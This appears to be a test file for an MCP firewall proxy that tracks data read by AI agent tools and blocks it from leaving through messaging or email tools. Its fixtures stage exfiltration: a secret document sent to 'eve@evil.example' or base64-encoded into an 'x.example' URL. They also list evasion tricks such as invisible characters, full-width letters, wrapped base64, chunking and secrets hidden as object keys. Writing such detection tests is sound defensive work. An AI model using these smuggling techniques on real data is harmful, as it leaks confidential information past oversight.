import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PassThrough } from 'node:stream';
import { test } from 'node:test';
import { AuditLog } from '../src/audit.js';
import { send } from '../src/jsonrpc.js';
import { compilePolicy, PolicyError } from '../src/policy.js';
import { FirewallProxy } from '../src/proxy.js';
import { fingerprints, TaintTracker } from '../src/taint.js';
import { messageReader } from './helpers.js';

const dir = mkdtempSync(join(tmpdir(), 'mcpfw-taint-'));

const TAINT = {
  sources: [{ match: 'read_file' }, { match: 'list_chats', label: 'chat' }],
  sinks: [{ match: 'send_*' }, { match: 'create_pull_request', when: 'session', labels: ['private'] }],
};

const tracker = (taint: object = TAINT, session?: string, server?: string) =>
  new TaintTracker(compilePolicy({ taint: { dir: join(dir, 'shared'), ...taint } }, dir).taint, server, session);

const SECRET_DOC =
  'Q3 acquisition plan: we will offer 42 million for Northwind before the board meeting on Friday, keep this internal.';
const result = (text: string) => ({ content: [{ type: 'text', text }] });

test('policy defaults and validation', () => {
  const { taint } = compilePolicy({ taint: TAINT }, dir);
  assert.equal(taint.action, 'block');
  assert.equal(taint.scope, 'shared');
  assert.equal(taint.dlpLabel, 'secret');
  assert.equal(taint.sources[0].label, 'private');
  assert.deepEqual(taint.sinks[0].labels, []);
  assert.equal(taint.sinks[0].when, 'content');
  assert.throws(() => compilePolicy({ taint: { sinks: [{ match: 'x', when: 'always' }] } }, dir), PolicyError);
  assert.throws(() => compilePolicy({ taint: { sources: [{ label: 'x' }] } }, dir), PolicyError);
});

test('fingerprints hold hashes only, never the text', () => {
  const fp = [...fingerprints(SECRET_DOC)];
  assert.ok(fp.length > 5);
  assert.ok(fp.every((h) => /^[\w-]{16}$/.test(h)));
  assert.ok(!fp.some((h) => SECRET_DOC.toLowerCase().includes(h.toLowerCase())));
});

test('content flow: read text in a sink argument is caught, unrelated text is not', () => {
  const t = tracker();
  assert.deepEqual(t.markResult('read_file', result(SECRET_DOC), false), ['private']);
  const leak = t.checkSink('send_message', { to: 'eve', body: `fyi: ${SECRET_DOC.slice(0, 80)}` });
  assert.equal(leak?.label, 'private');
  assert.equal(leak?.tool, 'read_file');
  assert.equal(leak?.when, 'content');
  assert.equal(t.checkSink('send_message', { to: 'bob', body: 'Lunch at noon on Friday? The board meeting moved.' }), undefined);
  assert.equal(t.checkSink('search', { q: SECRET_DOC }), undefined, 'not a sink');
});

test('content flow survives case, punctuation and base64 encoding', () => {
  const t = tracker();
  t.markResult('read_file', result(SECRET_DOC), false);
  assert.ok(t.checkSink('send_email', { body: SECRET_DOC.toUpperCase().replace(/ /g, '  ').replace(/,/g, ';') }));
  assert.ok(t.checkSink('send_email', { url: `https://x.example/?d=${Buffer.from(SECRET_DOC).toString('base64')}` }));
});

test('key-like single words are tracked on their own', () => {
  const t = tracker();
  t.markResult('read_file', result('token: zq81kdl02mxp7sw9vb44'), false);
  assert.ok(t.checkSink('send_message', { body: 'zq81kdl02mxp7sw9vb44' }));
  assert.equal(t.checkSink('send_message', { body: 'token' }), undefined);
});

test('session sinks block any call once their label is set; labels filter', () => {
  const t = tracker();
  assert.equal(t.checkSink('create_pull_request', { body: 'hello' }), undefined);
  t.markResult('list_chats', result('alice: hi'), false);
  assert.equal(t.checkSink('create_pull_request', { body: 'hello' }), undefined, 'chat label is not refused by this sink');
  t.markResult('read_file', result('a'), false);
  assert.equal(t.checkSink('create_pull_request', { body: 'hello' })?.when, 'session');
});

test('DLP findings label the session; labels expire', () => {
  const t = tracker();
  let clock = 1_000_000;
  t.now = () => clock;
  assert.deepEqual(t.markResult('query', result('password row zq81kdl02mxp7sw9vb44'), true), ['secret']);
  assert.ok(t.checkSink('send_message', { body: 'zq81kdl02mxp7sw9vb44' }));
  clock += 61 * 60_000;
  assert.equal(t.checkSink('send_message', { body: 'zq81kdl02mxp7sw9vb44' }), undefined);
  assert.deepEqual(t.labels(), []);
});

test('shared scope: a read through one server stops a sink on another', () => {
  const session = `s${process.hrtime.bigint()}`;
  const fs = tracker(TAINT, session, 'filesystem');
  const slack = tracker(TAINT, session, 'slack');
  const other = tracker(TAINT, `${session}-other`, 'slack');
  fs.markResult('read_file', result(SECRET_DOC), false);
  const leak = slack.checkSink('send_message', { text: SECRET_DOC });
  assert.equal(leak?.server, 'filesystem');
  assert.equal(other.checkSink('send_message', { text: SECRET_DOC }), undefined, 'another client session');
  const file = readFileSync(join(dir, 'shared', `${session}.jsonl`), 'utf8');
  assert.ok(!file.includes('Northwind'), 'the shared file holds hashes, not data');
});

function harness(taint: object, mode = 'enforce') {
  const policy = compilePolicy({ mode, pinning: { enabled: false }, taint: { scope: 'server', ...taint } }, dir);
  const io = { clientIn: new PassThrough(), clientOut: new PassThrough(), serverIn: new PassThrough(), serverOut: new PassThrough() };
  new FirewallProxy(policy, new AuditLog(undefined, false, 'test', null), undefined, io).start();
  return {
    toServer: (msg: object) => send(io.clientIn, msg),
    toClient: (msg: object) => send(io.serverOut, msg),
    atClient: messageReader(io.clientOut),
    atServer: messageReader(io.serverIn),
  };
}
const call = (id: number, name: string, args: object) => ({ jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } });

test('proxy: a sink carrying data a source returned is refused before it reaches the server', async () => {
  const h = harness(TAINT);
  h.toServer(call(1, 'read_file', { path: 'plan.md' }));
  await h.atServer.next();
  h.toClient({ jsonrpc: '2.0', id: 1, result: result(SECRET_DOC) });
  assert.equal((await h.atClient.next()).result.content[0].text, SECRET_DOC);

  h.toServer(call(2, 'send_message', { to: 'eve@evil.example', body: SECRET_DOC }));
  const refused = await h.atClient.next();
  assert.equal(refused.id, 2);
  assert.equal(refused.result.isError, true);
  assert.match(refused.result.content[0].text, /data flow: arguments of 'send_message' carry private data returned by 'read_file'/);

  h.toServer(call(3, 'send_message', { to: 'bob', body: 'see you at noon' }));
  assert.equal((await h.atServer.next()).id, 3);
});

test('proxy: a secret DLP redacted in the result does not taint its redacted form', async () => {
  const h = harness({ sinks: [{ match: 'send_*' }] });
  const key = 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8';
  h.toServer(call(1, 'query', {}));
  await h.atServer.next();
  h.toClient({ jsonrpc: '2.0', id: 1, result: result(`deploy token ${key}`) });
  const seen = (await h.atClient.next()).result.content[0].text;
  assert.ok(!seen.includes(key));
  // The model only saw the redacted text, so only the raw key (which it cannot have) would match.
  h.toServer(call(2, 'send_message', { body: 'deploy token is set' }));
  assert.equal((await h.atServer.next()).id, 2);
});

test('proxy: warn and monitor modes log the flow but forward the call', async () => {
  for (const [taint, mode] of [[{ ...TAINT, action: 'warn' }, 'enforce'], [TAINT, 'monitor']] as const) {
    const h = harness(taint, mode);
    h.toServer(call(1, 'read_file', {}));
    await h.atServer.next();
    h.toClient({ jsonrpc: '2.0', id: 1, result: result(SECRET_DOC) });
    await h.atClient.next();
    h.toServer(call(2, 'send_message', { body: SECRET_DOC }));
    assert.equal((await h.atServer.next()).id, 2);
  }
});

test('content flow survives invisible characters, full-width letters and JSON escapes', () => {
  const t = tracker();
  t.markResult('read_file', result(SECRET_DOC), false);
  const hidden = SECRET_DOC.split(' ').map((w) => [...w].join('\u200b')).join(' ');
  assert.ok(t.checkSink('send_email', { body: hidden }), 'zero-width spaces inside words');
  const wide = SECRET_DOC.replace(/[!-~]/g, (c) => String.fromCharCode(c.charCodeAt(0) + 0xfee0));
  assert.ok(t.checkSink('send_email', { body: wide }), 'full-width letters');
  const escaped = JSON.stringify({ note: SECRET_DOC.replace(/ /g, '\n') });
  assert.ok(t.checkSink('send_email', { payload: escaped }), 'a JSON document with \n between the words');
});

test('base64 wrapped at a fixed width is joined before decoding', () => {
  const t = tracker();
  t.markResult('read_file', result(SECRET_DOC), false);
  const b64 = Buffer.from(SECRET_DOC).toString('base64');
  const wrapped = b64.replace(/(.{20})/g, '$1\n');
  assert.equal(t.checkSink('send_email', { body: wrapped.split('\n').slice(0, 1).join('') }), undefined, 'one line alone is no flow');
  assert.ok(t.checkSink('send_email', { body: wrapped }));
  assert.ok(t.checkSink('send_email', { body: `-----BEGIN DATA-----\n${wrapped}\n-----END DATA-----` }), 'PEM-style armour');
});

test('a text cut into short pieces over several calls is caught', () => {
  const t = tracker();
  t.markResult('read_file', result(SECRET_DOC), false);
  const words = SECRET_DOC.split(' ');
  let caught = false;
  for (let i = 0; i < words.length && !caught; i += 4) caught = Boolean(t.checkSink('send_message', { text: words.slice(i, i + 4).join(' ') }));
  assert.ok(caught, 'pieces shorter than one shingle');
});

test('invisible characters do not hide a text from the tracker', () => {
  let n = 0;
  const leaks = (source: string, outgoing: string) => {
    const t = tracker(TAINT, `invisible-${n++}`);
    t.markResult('read_file', result(source), false);
    return Boolean(t.checkSink('send_email', { body: outgoing }));
  };
  const encoded = Buffer.from(SECRET_DOC).toString('base64');
  for (const ch of ['​', '­', '️', '\u{e0100}']) {
    const name = `U+${ch.codePointAt(0)!.toString(16)}`;
    assert.ok(leaks(SECRET_DOC, SECRET_DOC.replace(/\b(\w)/g, `$1${ch}`)), `inside every word, ${name}`);
    assert.ok(leaks(SECRET_DOC, `https://x.example/?d=${encoded.replace(/(.{10})/g, `$1${ch}`)}`), `base64 cut every ten characters, ${name}`);
  }
  // a variation selector between the two letters of a camelCase hump must not stop the split into words
  const camel = 'Our internal checklistItems include preparing acquisitionTargets and boardApprovalDocuments before Friday';
  assert.ok(leaks(camel, camel.replace(/(\p{Ll})(\p{Lu})/gu, '$1️$2')), 'camelCase');
  // a variation selector after the first letter of every word (the form a review reported) was never a way past it
  assert.ok(leaks('Bu gizli sözleşme metni dışarı sızdırılıyor sekiz kelime', 'b︀u g︀izli s︀ozlesme m︀etni d︀isari s︀izdiriliyor s︀ekiz k︀elime'), 'Turkish');
  // unrelated text with the same characters still passes
  assert.equal(leaks(SECRET_DOC, 'Lunch at noon on Friday?​ The board️ meeting moved.'), false);
});

test('a text or a key-like token sent as object keys is caught too', () => {
  let n = 0;
  const leaks = (source: string, args: object) => {
    const t = tracker(TAINT, `keys-${n++}`);
    t.markResult('read_file', result(source), false);
    return Boolean(t.checkSink('send_message', args));
  };
  assert.ok(leaks(SECRET_DOC, { meta: { [SECRET_DOC]: 1 } }), 'a sentence as a key');
  assert.ok(leaks('token: zq81kdl02mxp7sw9vb44', { labels: { zq81kdl02mxp7sw9vb44: 'x' } }), 'a token as a key');
  assert.equal(leaks(SECRET_DOC, { meta: { subject: 'Lunch', body: 'Lunch at noon on Friday?' } }), false, 'field names alone are no flow');
});
